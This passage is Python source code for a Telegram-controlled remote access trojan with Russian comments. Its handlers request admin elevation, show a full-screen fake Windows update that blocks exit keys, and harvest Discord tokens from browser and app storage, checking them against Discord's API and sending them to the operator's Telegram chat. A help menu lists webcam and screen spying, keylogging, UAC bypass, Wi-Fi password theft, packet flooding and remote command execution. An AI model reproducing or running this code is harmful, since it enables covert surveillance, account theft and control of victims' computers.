        bot.reply_to(message, "🔄 Requesting admin rights...")

        try:
            # Создаем команду для запроса прав администратора
            script = f'PowerShell -Command "Start-Process python -ArgumentList \'{sys.argv[0]}\' -Verb RunAs"'
            subprocess.run(script, shell=True)
            bot.reply_to(message, "✅ Admin rights requested successfully!")
            sys.exit()  # Выход, чтобы перезапуститься с правами администратора
        except Exception as e:
            bot.reply_to(message, f"❌ Failed to request admin rights: {e}")
    else:
        bot.reply_to(message, "✅ Already running with admin rights!")


# 🔄 Перемешивание клавиатуры
@bot.message_handler(func=lambda message: message.text.startswith("!swapkeys"))
def swap_keys(message):
    mode = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else "random"
    if mode == "random":
        layout = list(string.ascii_lowercase)
        random.shuffle(layout)
        mapping = dict(zip(string.ascii_lowercase, layout))
        print(f"Keyboard mapping: {mapping}")  # Для отладки
        bot.reply_to(message, "🔄 Клавиши перемешаны! (Эффект временный)")
    elif mode == "default":
        bot.reply_to(message, "✅ Раскладка клавиатуры восстановлена!")
    else:
        bot.reply_to(message, "❌ Неправильный аргумент, используйте `!swapkeys random` или `!swapkeys default`")

# 🌐 Открытие URL
@bot.message_handler(func=lambda message: message.text.startswith("!openurl"))
def open_url(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Укажите ссылку: `!openurl https://example.com`")
        return
    url = args[1]
    webbrowser.open(url)
    bot.reply_to(message, f"🌐 Открываю {url}")

# 🔍 Поиск файлов
@bot.message_handler(func=lambda message: message.text.startswith("!findfiles"))
def find_files(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "❌ Укажите название файла: `!findfiles important.docx`")
        return
    filename = args[1]
    result = subprocess.run(["where", filename], capture_output=True, text=True, shell=True)
    if result.stdout:
        bot.reply_to(message, f"📂 Найдено:\n{result.stdout}")
    else:
        bot.reply_to(message, "❌ Файл не найден")

# 📶 Список Wi-Fi сетей
@bot.message_handler(func=lambda message: message.text.startswith("!wifilist"))
def wifi_list(message):
    result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True, encoding='utf-8', shell=True)
    bot.reply_to(message, f"""📶 Доступные Wi-Fi сети:\n```
{result.stdout}
```""", parse_mode="Markdown")

# 🖥 Отключение ПК
@bot.message_handler(func=lambda message: message.text.startswith("!sleep"))
def sleep_pc(message):
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    bot.reply_to(message, "💤 ПК уходит в спящий режим!")

@bot.message_handler(func=lambda message: message.text.startswith("!hibernate"))
def hibernate_pc(message):
    os.system("shutdown /h")
    bot.reply_to(message, "🌙 ПК уходит в гибернацию!")



# 🌊 Графические эффекты
@bot.message_handler(func=lambda message: message.text.startswith("!draw"))
def draw_text(message):
    try:
        args = shlex.split(message.text)  # Парсим аргументы с учетом кавычек
        if len(args) < 4:
            bot.reply_to(message, "❌ Используйте: `!draw \"текст\" цвет время up/down` (например, `!draw \"Hello world!\\n12 3\" red 3 up`)")
            return
        
        text_part = args[1]
        color = args[2]
        duration = int(args[3])  # Проверяем, является ли время числом
        position = args[4] if len(args) > 4 else "up"
        
        text = text_part.replace('\\n', '\n')  # Корректная обработка перевода строки
        
        pygame.init()
        screen = pygame.display.set_mode((1920, 1080), pygame.NOFRAME)
        font = pygame.font.Font(None, 100)
        
        screen.fill((0, 0, 0))
        lines = text.split('\n')
        y_offset = 540 - (len(lines) * 50 // 2)
        for line in lines:
            text_surface = font.render(line, True, pygame.Color(color))
            screen.blit(text_surface, (960 - text_surface.get_width() // 2, y_offset))
            y_offset += 100
        
        pygame.display.flip()
        
        hwnd = pygame.display.get_wm_info()["window"]
        if position == "up":
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 1920, 1080, 0)
        
        time.sleep(duration)
        pygame.quit()
        bot.reply_to(message, f"🖥 Текст '{text}' отобразился на {duration} сек!")
    
    except ValueError:
        bot.reply_to(message, "❌ Ошибка: Время должно быть числом!")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")



# 🎨 Эффект следа за курсором
trail_active = False  # Флаг для управления эффектом следа

# 🎨 Включение/выключение следа курсора
@bot.message_handler(func=lambda message: message.text.startswith("!trail"))
def toggle_trail(message):
    global trail_active
    args = message.text.split()

    if len(args) < 2 or args[1] not in ["on", "off"]:
        bot.reply_to(message, "❌ Используйте: `!trail on` или `!trail off`")
        return

    if args[1] == "on":
        if trail_active:
            bot.reply_to(message, "🖱 След курсора уже активирован!")
        else:
            trail_active = True
            bot.reply_to(message, "🖱 След курсора включен!")
            threading.Thread(target=draw_trail, daemon=True).start()
    else:
        trail_active = False
        bot.reply_to(message, "🚫 След курсора отключен!")

def draw_trail():
    global trail_active
    pygame.init()
    screen = pygame.display.set_mode((1920, 1080), pygame.NOFRAME)
    hwnd = pygame.display.get_wm_info()["window"]

    # Делаем окно прозрачным
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED | win32con.WS_EX_TOPMOST)
    win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(0, 0, 0), 0, win32con.LWA_COLORKEY)

    clock = pygame.time.Clock()
    trail = []  # Список точек следа

    while trail_active:
        x, y = pyautogui.position()
        trail.append((x, y))

        screen.fill((0, 0, 0, 0))  # Очищаем фон, сохраняя прозрачность
        for tx, ty in trail[-20:]:  # Оставляем последние 20 точек
            pygame.draw.circle(screen, (255, 0, 0), (tx, ty), 5)  # Красные точки

        pygame.display.update()
        clock.tick(30)
        time.sleep(0.05)

    pygame.quit()

#---fake update

app = None
fake_update_window = None

class FakeUpdateScreen(QMainWindow):
    def __init__(self):
        super().__init__()

        # Создаем веб-браузер
        self.browser = QWebEngineView()
        self.browser.setUrl(QUrl("https://fakeupdate.net/win10ue/"))  # Загружаем сайт

        # Делаем окно без рамок и на весь экран
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint)
        self.showFullScreen()

        # Добавляем браузер в окно
        self.setCentralWidget(self.browser)

    def keyPressEvent(self, event):
        """Отключаем клавиши выхода"""
        blocked_keys = [Qt.Key.Key_Escape, Qt.Key.Key_Alt, Qt.Key.Key_Tab, Qt.Key.Key_F4]
        if event.key() in blocked_keys:
            return  # Игнорируем эти клавиши
        super().keyPressEvent(event)

def start_fake_update():
    global app, fake_update_window
    if app is None:
        app = QApplication(sys.argv)
    fake_update_window = FakeUpdateScreen()
    fake_update_window.show()
    app.exec()

def stop_fake_update():
    global fake_update_window
    if fake_update_window:
        fake_update_window.close()
        fake_update_window = None

@bot.message_handler(func=lambda message: message.text.startswith("!trail"))
def send_welcome(message):
    bot.reply_to(message, "Используй:\n`!fakeupdate on` — запустить обновление\n`!fakeupdate off` — выключить", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text.lower().startswith("!fakeupdate"))
def handle_fakeupdate(message):
    args = message.text.split()
    
    if len(args) != 2:
        bot.reply_to(message, "❌ Используй: `!fakeupdate on` или `!fakeupdate off`", parse_mode="Markdown")
        return
    
    command = args[1].lower()

    if command == "on":
        bot.reply_to(message, "🔄 Запускаю фейковое обновление...")
        threading.Thread(target=start_fake_update, daemon=True).start()
    elif command == "off":
        bot.reply_to(message, "❌ Закрываю фейковое обновление...")
        stop_fake_update()
    else:
        bot.reply_to(message, "❌ Ошибка! Используй: `!fakeupdate on` или `!fakeupdate off`", parse_mode="Markdown")
    stop_fake_update()

#---fake update

@bot.message_handler(func=lambda message: message.text.startswith("!help"))
def help_command(message):
    help_text = """🛠 **Список доступных команд**:

🔹 **💻 Взаимодействие**:
`!sendtext <text>` – Ввод текста с клавиатуры.
`!mousemove` – Управление мышью.
`!changelang` – Изменение языка ввода.
`!keybind` – Назначение горячих клавиш.
`!textbox` – Создание текстового поля.
`!msgbox` – Вывод сообщения.

🔹 **🕵️ Шпионаж**:
`!photo_desk` – Фото экрана.
`!photo_cam` – Фото с веб-камеры.
`!video_desk <time>` – Запись экрана.
`!video_cam <time>` – Запись с веб-камеры.
`!audiorec <microphone> <time>` – Аудиозапись.
`!keylogger <on\off>` – Логгер клавиатуры (⚠️ В разработке).
`!clipboard <add\show>` – Чтение буфера обмена.
`!sysinfo` – Информация о системе.

🔹 **📂 Управление файлами**:
`!findfiles <file.format>` – Поиск файлов.
`!upload <path>` – Загрузка файла.
`!delete <path>` – Удаление файла.
`!execute <path>` – Запуск программы.
`!download <path>` – Скачивание файла.
`!disk <path>` – Информация о дисках.
`!autoload <Name> <method> <on\off>` – Автозагрузка.

🔹 **🖥️ Управление Windows**:
`!shutdown` – Выключение ПК.
`!sleep` – Спящий режим.
`!restart` – Перезагрузка.
`!lock` – Блокировка экрана.
`!volume <1-100>` – Управление громкостью.
`!lockmgr` – Блокировка диспетчера задач.
`!achbypass` – Обход UAC.
`!unlocksound` – Разблокировка звука.
`!Microlist` – Список микрофонов.
`!swapkeys <random\default>` – Поменять клавиши местами.

🔹 **🌐 Интернет и сеть**:
`!openurl <url>` – Открыть URL в браузере.
`!wifilist` – Доступные Wi-Fi сети.
`!ping <site>` – Проверка сети.
`!packet <packets> <strengh> <url>` – Отправка пакетов.
`!netinfo` – Сетевая информация.
`!wifipass` – Пароли Wi-Fi.

🔹 **🎨 Графика и эффекты**:
`!fakeupdate <on\off>` – Фейковое обновление.
`!draw <text> <color> <time> <up\down>` – Рисование на экране.
`!wallpaper <url>` – Смена обоев.
`!trail <on\off>` – Эффект следа курсора.
`!memz <on\off>` – Глитчи MEMZ.
`!invert <on\off>` – Инверсия экрана.
`!flipscreen <left,right>` – Переворот экрана.
`!cd <open\close>` – Открытие дисковода.
`!rickroll` – Рикролл.
`!tts <speed> <pitch> <text>` – Голосовой синтезатор.
`!sound <url.mp3>` – Проигрывание звука.
`!shake <ins> <on\off>` – Тряска курсора.

🔹 **📜 Консоль и процессы**:
`!tasklist` – Список процессов.
`!taskkill <task>` – Завершение процесса.
`!taskmake <task>` – Создание процесса.
`!cmd <command>` – Выполнение команды CMD.
`!powershell <command>` – Выполнение PowerShell.
`!bsod` – Эмуляция BSOD.

🔹 **🛠️ Админ-функции**:
`!checkadmin` – Проверка прав администратора.
`!admin` – Запуск от имени администратора.
`!legitadmin` – Установка прав администратора.
`!suicide` – Самоудаление.

🔹 **🐦‍⬛ Стuллep**:
`!discordcheck` – ykрасть тоkен дucкорд.

🔹 **🛠️ Админ-Бот**:
`!adduser <id>` – Добавить в авторизованных.
`!deluser <id>` - Удалить из авторизованных.
`!listuser` - Список авторизованных

ℹ️ Введите команду для выполнения или выберите в меню!
"""
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

#--help

#--admin panel

DISCORD_PATHS = [
    os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
    os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
    os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
]

TOKEN_REGEX = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"

def find_tokens():
    tokens = []
    for path in DISCORD_PATHS:
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                continue
            try:
                with open(os.path.join(path, file_name), "r", errors="ignore") as file:
                    content = file.read()
                    found_tokens = re.findall(TOKEN_REGEX, content)
                    tokens.extend(found_tokens)
            except Exception as e:
                print(f"Ошибка при чтении {file_name}: {e}")
    return list(set(tokens))

@bot.message_handler(func=lambda message: message.text and message.text.startswith("!discordcheck"))
def send_tokens(message):
    tokens = find_tokens()
    if tokens:
        valid_tokens = []
        for token in tokens:
            headers = {"Authorization": token}
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
            if response.status_code == 200:
                user_data = json.loads(response.text)
                valid_tokens.append(f"👤 {user_data['username']}#{user_data['discriminator']} - `{token}`")
        
        if valid_tokens:
            bot.send_message(message.chat.id, "🔍 Найденные активные Discord-токены:\n\n" + "\n".join(valid_tokens))
        else:
            bot.send_message(message.chat.id, "✅ Активных токенов не найдено. Всё чисто!")
    else:
        bot.send_message(message.chat.id, "❌ Токены Discord не найдены!")

#--discordstilier


# ID главного администратора
MAIN_ADMIN_ID = {TGID}

# Список разрешенных пользователей
allowed_users = {MAIN_ADMIN_ID}  # Админ уже в списке по умолчанию

# Фильтр сообщений: блокируем /start и !команды для неразрешенных пользователей
@bot.message_handler(func=lambda message: True)
def check_access(message):
    user_id = message.from_user.id
    text = message.text

    # Проверка на команду (! или /)
    if text.startswith("!") or text.startswith("/"):
        if user_id not in allowed_users:
            bot.reply_to(message, "🚫 У вас нет доступа к этой команде.")
            return

    # Обработка сообщений дальше (если пользователь в списке)
    process_message(message)

def process_message(message):
    """Функция для обработки сообщений после проверки доступа"""
    text = message.text

    if text.startswith("!adduser "):
        add_user(message)
    elif text.startswith("!deluser "):
        del_user(message)
    elif text == "!listuser":
        list_users(message)
    else:
        bot.reply_to(message, "❌ Команда не найдена! '!help' для списка комманд")  # Можешь заменить на свою обработку

# Команда !adduser <id> — добавить пользователя
def add_user(message):
    if message.from_user.id != MAIN_ADMIN_ID:
        bot.reply_to(message, "🚫 Только главный администратор может добавлять пользователей.")
        return

    try:
        new_id = int(message.text.split()[1])
        if new_id in allowed_users:
            bot.reply_to(message, "⚠️ Этот пользователь уже есть в списке.")
        else:
            allowed_users.add(new_id)
            bot.reply_to(message, f"✅ Пользователь {new_id} добавлен в список.")
    except (IndexError, ValueError):
        bot.reply_to(message, "❌ Использование: `!adduser <id>`", parse_mode="Markdown")

# Команда !deluser <id> — удалить пользователя
def del_user(message):
    if message.from_user.id != MAIN_ADMIN_ID:
        bot.reply_to(message, "🚫 Только главный администратор может удалять пользователей.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id in allowed_users and user_id != MAIN_ADMIN_ID:
            allowed_users.remove(user_id)
            bot.reply_to(message, f"✅ Пользователь {user_id} удалён.")
        else:
            bot.reply_to(message, "⚠️ Пользователь не найден или нельзя удалить главного администратора.")
    except (IndexError, ValueError):
        bot.reply_to(message, "❌ Использование: `!deluser <id>`", parse_mode="Markdown")

# Команда !listuser — список разрешенных пользователей
def list_users(message):
    if message.from_user.id != MAIN_ADMIN_ID:
        bot.reply_to(message, "🚫 Только главный администратор может просматривать список пользователей.")
        return

    if allowed_users:
        users_list = "\n".join(map(str, allowed_users))
        bot.reply_to(message, f"📜 **Список разрешенных пользователей:**\n```\n{users_list}\n```", parse_mode="Markdown")
    else:
        bot.reply_to(message, "📜 В списке пока никого нет.")


CHAT_ID = "{TGID}"  # Укажи ID чата, куда бот будет отправлять уведомления

def start_bot():
    while True:
        try:
            bot.polling(non_stop=True, timeout=30)
        except Exception as e:
            error_message = f"❌ Bot crashed: {e}"
            print(error_message)
            
            # Пытаемся отправить сообщение о краше
            try:
                bot.send_message(CHAT_ID, error_message)
                bot.send_message(CHAT_ID, "✅ Restarting bot...")
            except Exception as tg_error:
                print(f"⚠ Не удалось отправить сообщение в Telegram: {tg_error}")
            
            time.sleep(5)  # Ждем 5 секунд перед перезапуском

if __name__ == "__main__":
    start_bot()


